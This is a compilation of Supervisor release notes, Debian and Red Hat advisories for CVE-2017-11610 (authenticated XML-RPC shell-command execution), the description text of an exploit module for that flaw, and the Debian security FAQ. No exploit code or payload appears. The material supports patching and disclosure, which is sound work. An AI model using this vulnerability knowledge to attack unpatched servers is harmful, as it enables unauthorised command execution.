- To provide a hook point for custom results returned from event handlers (see above) the [eventlistener:x] configuration sections now accept a "result\_handler=" parameter, e.g. "result\_handler=supervisor.dispatchers:default\_handler" (the default) or "handler=mypackage:myhandler". The keys are pkgutil "entry point" specifications (importable Python function names). Result handlers must be callables which accept two arguments: one named "event" which represents the event, and the other named "result", which represents the listener's result. A result handler either executes successfully or raises an exception. If it raises a supervisor.dispatchers.RejectEvent exception, the event will be rebuffered, and the eventhandler will be placed back into the ACKNOWLEDGED state. If it raises any other exception, the event handler will be placed in the UNKNOWN state. If it does not raise any exception, the event is considered successfully processed. A result handler's return value is ignored. Writing a result handler is a "in case of emergency break glass" sort of thing, it is not something to be used for arbitrary business code. In particular, handlers \*must not block\* for any appreciable amount of time.
 The standard eventlistener result handler (supervisor.dispatchers:default\_handler) does nothing if it receives an "OK" and will raise a supervisor.dispatchers.RejectEvent exception if it receives any other value.
- Supervisord now emits TICK events, which happen every N seconds. Three types of TICK events are available: TICK\_5 (every five seconds), TICK\_60 (every minute), TICK\_3600 (every hour). Event listeners may subscribe to one of these types of events to perform every-so-often processing. TICK events are subtypes of the EVENT type.
- Get rid of OSX platform-specific memory monitor and replace with memmon.py, which works on both Linux and Mac OS. This script is now a console script named "memmon".
- Allow "web handler" (the handler which receives http requests from browsers visiting the web UI of supervisor) to deal with POST requests.
- RPC interface methods stopProcess(), stopProcessGroup(), and stopAllProcesses() now take an optional "wait" argument that defaults to True for parity with the start methods.
3.0a3 (2007-10-02)------------------
- Supervisorctl now reports a better error message when the main supervisor XML-RPC namespace is not registered. Thanks to Mike Orr for reporting this. (Mike Naberezny)
- Create ``scripts`` directory within supervisor package, move ``pidproxy.py`` there, and place sample event listener and comm event programs within the directory.
- When an event notification is buffered (either because a listener rejected it or because all listeners were busy when we attempted to send it originally), we now rebuffer it in a way that will result in it being retried earlier than it used to be.
- When a listener process exits (unexpectedly) before transitioning from the BUSY state, rebuffer the event that was being processed.
- supervisorctl ``tail`` command now accepts a trailing specifier: ``stderr`` or ``stdout``, which respectively, allow a user to tail the stderr or stdout of the named process. When this specifier is not provided, tail defaults to stdout.
- supervisor ``clear`` command now clears both stderr and stdout logs for the given process.
- When a process encounters a spawn error as a result of a failed execve or when it cannot setuid to a given uid, it now puts this info into the process' stderr log rather than its stdout log.
- The event listener protocol header now contains the ``server`` identifier, the ``pool`` that the event emanated from, and the ``poolserial`` as well as the values it previously contained (version, event name, serial, and length). The server identifier is taken from the config file options value ``identifier``, the ``pool`` value is the name of the listener pool that this event emanates from, and the ``poolserial`` is a serial number assigned to the event local to the pool that is processing it.
- The event listener protocol header is now a sequence of key-value pairs rather than a list of positional values. Previously, a representative header looked like::
 SUPERVISOR3.0 PROCESS\_COMMUNICATION\_STDOUT 30 22\n
 Now it looks like::
 ver:3.0 server:supervisor serial:21 ...
- Specific event payload serializations have changed. All event types that deal with processes now include the pid of the process that the event is describing. In event serialization "header" values, we've removed the space between the header name and the value and headers are now separated by a space instead of a line feed. The names of keys in all event types have had underscores removed.
- Abandon the use of the Python stdlib ``logging`` module for speed and cleanliness purposes. We've rolled our own.
- Fix crash on start if AUTO logging is used with a max\_bytes of zero for a process.
- Improve process communication event performance.
- The process config parameters ``stdout\_capturefile`` and ``stderr\_capturefile`` are no longer valid. They have been replaced with the ``stdout\_capture\_maxbytes`` and ``stderr\_capture\_maxbytes`` parameters, which are meant to be suffix-multiplied integers. They both default to zero. When they are zero, process communication event capturing is not performed. When either is nonzero, the value represents the maximum number of bytes that will be captured between process event start and end tags. This change was to support the fact that we no longer keep capture data in a separate file, we just use a FIFO in RAM to maintain capture info. For users whom don't care about process communication events, or whom haven't changed the defaults for ``stdout\_capturefile`` or ``stderr\_capturefile``, they needn't do anything to their configurations to deal with this change.
- Log message levels have been normalized. In particular, process stdin/stdout is now logged at ``debug`` level rather than at ``trace`` level (``trace`` level is now reserved for output useful typically for debugging supervisor itself). See "Supervisor Log Levels" in the documentation for more info.
- When an event is rebuffered (because all listeners are busy or a listener rejected the event), the rebuffered event is now inserted in the head of the listener event queue. This doesn't guarantee event emission in natural ordering, because if a listener rejects an event or dies while it's processing an event, it can take an arbitrary amount of time for the event to be rebuffered, and other events may be processed in the meantime. But if pool listeners never reject an event or don't die while processing an event, this guarantees that events will be emitted in the order that they were received because if all listeners are busy, the rebuffered event will be tried again "first" on the next go-around.
- Removed EVENT\_BUFFER\_OVERFLOW event type.
- The supervisorctl xmlrpc proxy can now communicate with supervisord using a persistent HTTP connection.
- A new module "supervisor.childutils" was added. This module provides utilities for Python scripts which act as children of supervisord. Most notably, it contains an API method "getRPCInterface" allows you to obtain an xmlrpxlib ServerProxy that is willing to communicate with the parent supervisor. It also contains utility functions that allow for parsing of supervisor event listener protocol headers. A pair of scripts (loop\_eventgen.py and loop\_listener.py) were added to the script directory that serve as examples about how to use the childutils module.
- A new envvar is added to child process environments: SUPERVISOR\_SERVER\_URL. This contains the server URL for the supervisord running the child.
- An ``OK`` URL was added at ``/ok.html`` which just returns the string ``OK`` (can be used for up checks or speed checks via plain-old-HTTP).
- An additional command-line option ``--profile\_options`` is accepted by the supervisord script for developer use::
 supervisord -n -c sample.conf --profile\_options=cumulative,calls
 The values are sort\_stats options that can be passed to the standard Python profiler's PStats sort\_stats method.
 When you exit supervisor, it will print Python profiling output to stdout.
- If cElementTree is installed in the Python used to invoke supervisor, an alternate (faster, by about 2X) XML parser will be used to parse XML-RPC request bodies. cElementTree was added as an "extras\_require" option in setup.py.
- Added the ability to start, stop, and restart process groups to supervisorctl. To start a group, use ``start groupname:\*``. To start multiple groups, use ``start groupname1:\* groupname2:\*``. Equivalent commands work for "stop" and "restart". You can mix and match short processnames, fullly-specified group:process names, and groupsplats on the same line for any of these commands.
- Added ``directory`` option to process config. If you set this option, supervisor will chdir to this directory before executing the child program (and thus it will be the child's cwd).
- Added ``umask`` option to process config. If you set this option, supervisor will set the umask of the child program. (Thanks to Ian Bicking for the suggestion).
- A pair of scripts ``osx\_memmon\_eventgen.py`` and `osx\_memmon\_listener.py`` have been added to the scripts directory. If they are used together as described in their comments, processes which are consuming "too much" memory will be restarted. The ``eventgen`` script only works on OSX (my main development platform) but it should be trivially generalizable to other operating systems.
- The long form ``--configuration`` (-c) command line option for supervisord was broken. Reported by Mike Orr. (Mike Naberezny)
- New log level: BLAT (blather). We log all supervisor-internal-related debugging info here. Thanks to Mike Orr for the suggestion.
- We now allow supervisor to listen on both a UNIX domain socket and an inet socket instead of making them mutually exclusive. As a result, the options "http\_port", "http\_username", "http\_password", "sockchmod" and "sockchown" are no longer part of the ``[supervisord]`` section configuration. These have been supplanted by two other sections: ``[unix\_http\_server]`` and ``[inet\_http\_server]``. You'll need to insert one or the other (depending on whether you want to listen on a UNIX domain socket or a TCP socket respectively) or both into your supervisord.conf file. These sections have their own options (where applicable) for port, username, password, chmod, and chown. See README.txt for more information about these sections.
- All supervisord command-line options related to "http\_port", "http\_username", "http\_password", "sockchmod" and "sockchown" have been removed (see above point for rationale).
- The option that \*used\* to be ``sockchown`` within the ``[supervisord]`` section (and is now named ``chown`` within the ``[unix\_http\_server]`` section) used to accept a dot-separated user.group value. The separator now must be a colon ":", e.g. "user:group". Unices allow for dots in usernames, so this change is a bugfix. Thanks to Ian Bicking for the bug report.
- If a '-c' option is not specified on the command line, both supervisord and supervisorctl will search for one in the paths ``./supervisord.conf`` , ``./etc/supervisord.conf`` (relative to the current working dir when supervisord or supervisorctl is invoked) or in ``/etc/supervisord.conf`` (the old default path). These paths are searched in order, and supervisord and supervisorctl will use the first one found. If none are found, supervisor will fail to start.
- The Python string expression ``%(here)s`` (referring to the directory in which the the configuration file was found) can be used within the following sections/options within the config file::
 unix\_http\_server:file supervisor:directory supervisor:logfile supervisor:pidfile supervisor:childlogdir supervisor:environment program:environment program:stdout\_logfile program:stderr\_logfile program:process\_name program:command
- The ``--environment`` aka ``-b`` option was removed from the list of available command-line switches to supervisord (use "A=1 B=2 bin/supervisord" instead).
- If the socket filename (the tail-end of the unix:// URL) was longer than 64 characters, supervisorctl would fail with an encoding error at startup.
- The ``identifier`` command-line argument was not functional.
- Fixed http://www.plope.com/software/collector/215 (bad error message in supervisorctl when program command not found on PATH).
- Some child processes may not have been shut down properly at supervisor shutdown time.
- Move to ZPL-derived (but not ZPL) license availble from http://www.repoze.org/LICENSE.txt; it's slightly less restrictive than the ZPL (no servicemark clause).
- Spurious errors related to unclosed files ("bad file descriptor", typically) were evident at supervisord "reload" time (when using the "reload" command from supervisorctl).
- We no longer bundle ez\_setup to bootstrap setuptools installation.
3.0a2 (2007-08-24)------------------
- Fixed the README.txt example for defining the supervisor RPC interface in the configuration file. Thanks to Drew Perttula.
- Fixed a bug where process communication events would not have the proper payload if the payload data was very short.
- when supervisord attempted to kill a process with SIGKILL after the process was not killed within "stopwaitsecs" using a "normal" kill signal, supervisord would crash with an improper AssertionError. Thanks to Calvin Hendryx-Parker.
- On Linux, Supervisor would consume too much CPU in an effective "busywait" between the time a subprocess exited and the time at which supervisor was notified of its exit status. Thanks to Drew Perttula.
- RPC interface behavior change: if the RPC method "sendProcessStdin" is called against a process that has closed its stdin file descriptor (e.g. it has done the equivalent of "sys.stdin.close(); os.close(0)"), we return a NO\_FILE fault instead of accepting the data.
- Changed the semantics of the process configuration ``autorestart`` parameter with respect to processes which move between the RUNNING and EXITED state. ``autorestart`` was previously a boolean. Now it's a trinary, accepting one of ``false``, ``unexpected``, or ``true``. If it's ``false``, a process will never be automatically restarted from the EXITED state. If it's ``unexpected``, a process that enters the EXITED state will be automatically restarted if it exited with an exit code that was not named in the process config's ``exitcodes`` list. If it's ``true``, a process that enters the EXITED state will be automatically restarted unconditionally. The default is now ``unexpected`` (it was previously ``true``). The readdition of this feature is a reversion of the behavior change note in the changelog notes for 3.0a1 that asserted we never cared about the process' exit status when determining whether to restart it or not.
- setup.py develop (and presumably setup.py install) would fail under Python 2.3.3, because setuptools attempted to import ``splituser`` from urllib2, and it didn't exist.
- It's now possible to use ``setup.py install`` and ``setup.py develop`` on systems which do not have a C compiler if you set the environment variable "NO\_MELD3\_EXTENSION\_MODULES=1" in the shell in which you invoke these commands (versions of meld3 > 0.6.1 respect this envvar and do not try to compile optional C extensions when it's set).
- The test suite would fail on Python versions <= 2.3.3 because the "assertTrue" and "assertFalse" methods of unittest.TestCase didn't exist in those versions.
- The ``supervisorctl`` and ``supervisord`` wrapper scripts were disused in favor of using setuptools' ``console\_scripts`` entry point settings.
- Documentation files and the sample configuration file are put into the generated supervisor egg's ``doc`` directory.

Package        : supervisor
CVE ID         : CVE-2017-11610
Debian Bug     : 870187

Calum Hutton reported that the XML-RPC server in supervisor, a system
for controlling process state, does not perform validation on requested
XML-RPC methods, allowing an authenticated client to send a malicious
XML-RPC request to supervisord that will run arbitrary shell commands on
the server as the same user as supervisord.

The vulnerability has been fixed by disabling nested namespace lookup
entirely. supervisord will now only call methods on the object
registered to handle XML-RPC requests and not any child objects it may
contain, possibly breaking existing setups. No publicly available
plugins are currently known that use nested namespaces. Plugins that use
a single namespace will continue to work as before. Details can be found
on the upstream issue at
<https://github.com/Supervisor/supervisor/issues/964> .

For the oldstable distribution (jessie), this problem has been fixed
in version 3.0r1-1+deb8u1.

For the stable distribution (stretch), this problem has been fixed in
version 3.3.1-1+deb9u1.

We recommend that you upgrade your supervisor packages.

## Synopsis

Important: Red Hat CloudForms security, bug fix, and enhancement update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A3005)

## Topic

An update is now available for CloudForms Management Engine 5.8.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Red Hat CloudForms Management Engine delivers the insight, control, and automation needed to address the challenges of managing virtual environments. CloudForms Management Engine is built on Ruby on Rails, a model-view-controller (MVC) framework for web application development. Action Pack implements the controller and the view components.

The following packages have been upgraded to a later upstream version: ansible-tower (3.1.5), cfme (5.8.2.3), cfme-appliance (5.8.2.3), cfme-gemset (5.8.2.3), rabbitmq-server (3.6.9), rh-ruby23-rubygem-nokogiri (1.8.1), supervisor (3.1.4). (BZ#1476286, BZ#1485484)

Security Fix(es):

* A flaw was found in Tower's interface with SCM repositories. If a Tower project (SCM repository) definition does not have the 'delete before update' flag set, an attacker with commit access to the upstream playbook source repository could create a Trojan playbook that, when executed by Tower, modifies the checked out SCM repository to add git hooks. These git hooks could, in turn, cause arbitrary command and code execution as the user Tower runs as. (CVE-2017-12148)
* A vulnerability was found in the XML-RPC interface in supervisord. When processing malformed commands, an attacker can cause arbitrary shell commands to be executed on the server as the same user as supervisord. Exploitation requires the attacker to first be authenticated to the supervisord service. (CVE-2017-11610)

The CVE-2017-12148 issue was discovered by Ryan Petrello (Red Hat).

Additional Changes:

This update also fixes several bugs and adds various enhancements. Documentation for these changes is available from the Release Notes document linked to in the References section.

      'Description'    => %q{
        This module exploits a vulnerability in the Supervisor process control software, where an authenticated client
        can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server.
        The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this
        may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been
        configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.2.3 (2016-03-19)------------------
- 400 Bad Request is now returned if an XML-RPC request is received with invalid body data. In previous versions, 500 Internal Server Error was returned.
3.2.2 (2016-03-04)------------------
- Parsing the config file will now fail with an error message if an ``inet\_http\_server`` or ``unix\_http\_server`` section contains a ``username=`` but no ``password=``. In previous versions, ``supervisord`` would start with this invalid configuration but the HTTP server would always return a 500 Internal Server Error. Thanks to Chris Ergatides for reporting this issue.
3.2.1 (2016-02-06)------------------
- Fixed a server exception ``OverflowError: int exceeds XML-RPC limits`` that made ``supervisorctl status`` unusable if the system time was far into the future. The XML-RPC API returns timestamps as XML-RPC integers, but timestamps will exceed the maximum value of an XML-RPC integer in January 2038 ("Year 2038 Problem"). For now, timestamps exceeding the maximum integer will be capped at the maximum to avoid the exception and retain compatibility with existing API clients. In a future version of the API, the return type for timestamps will be changed.
3.2.0 (2015-11-30)------------------
- Files included via the ``[include]`` section are read in sorted order. In past versions, the order was undefined. Patch by Ionel Cristian Mărieș.
- ``supervisorctl start`` and ``supervisorctl stop`` now complete more quickly when handling many processes. Thanks to Chris McDonough for this patch. See: https://github.com/Supervisor/supervisor/issues/131
- Environment variables are now expanded for all config file options. Patch by Dexter Tad-y.
- Added ``signalProcess``, ``signalProcessGroup``, and ``signalAllProcesses`` XML-RPC methods to supervisor RPC interface. Thanks to Casey Callendrello, Marc Abramowitz, and Moriyoshi Koizumi for the patches.
- Added ``signal`` command to supervisorctl. Thanks to Moriyoshi Koizumi and Marc Abramowitz for the patches.
